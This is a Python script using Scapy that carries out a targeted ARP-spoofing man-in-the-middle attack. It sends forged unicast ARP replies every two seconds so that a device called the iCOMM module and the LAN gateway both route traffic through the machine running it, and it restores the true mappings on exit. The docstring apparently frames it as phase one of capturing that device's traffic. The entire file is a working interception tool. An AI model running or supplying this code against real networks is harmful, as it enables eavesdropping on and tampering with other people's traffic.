#!/usr/bin/env python3
"""Targeted unicast ARP redirect (sendp/L2 fixed): module <-> gateway via this Pi.

Phase 1 of the iCOMM capture. Sends *unicast* ARP replies every 2s via sendp()
so only the module's and the gateway's caches are affected. SIGTERM restores
the true mappings. Run bounded:  sudo timeout 900 python3 arpspoof.py wlan0
"""
import atexit
import signal
import sys
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp

MODULE_IP = "10.0.1.187"
MODULE_MAC = "d0:17:69:f8:f3:1c"
GW_IP = "10.0.1.1"
GW_MAC = "d0:21:f9:c5:9e:30"

iface = sys.argv[1] if len(sys.argv) > 1 else conf.iface
me = get_if_hwaddr(iface)
print(f"unicast spoofing on {iface} ({me}): {MODULE_IP}<->{GW_IP} both -> us", flush=True)

running = True
sent = 0

def restore():
    print(f"restoring true ARP mappings after {sent} cycles...", flush=True)
    sendp(Ether(dst=MODULE_MAC) / ARP(op=2, psrc=GW_IP, hwsrc=GW_MAC, pdst=MODULE_IP, hwdst=MODULE_MAC), iface=iface, count=3, verbose=0)
    sendp(Ether(dst=GW_MAC) / ARP(op=2, psrc=MODULE_IP, hwsrc=MODULE_MAC, pdst=GW_IP, hwdst=GW_MAC), iface=iface, count=3, verbose=0)

def stop(*a):
    global running
    running = False

signal.signal(signal.SIGINT, stop)
signal.signal(signal.SIGTERM, stop)
atexit.register(restore)

while running:
    # To the module only: "I am the gateway"
    sendp(Ether(dst=MODULE_MAC) / ARP(op=2, psrc=GW_IP, hwsrc=me, pdst=MODULE_IP, hwdst=MODULE_MAC), iface=iface, verbose=0)
    # To the gateway only: "I am the module"
    sendp(Ether(dst=GW_MAC) / ARP(op=2, psrc=MODULE_IP, hwsrc=me, pdst=GW_IP, hwdst=GW_MAC), iface=iface, verbose=0)
    sent += 1
    if sent % 15 == 0:
        print(f"{sent} cycles sent", flush=True)
    time.sleep(2)
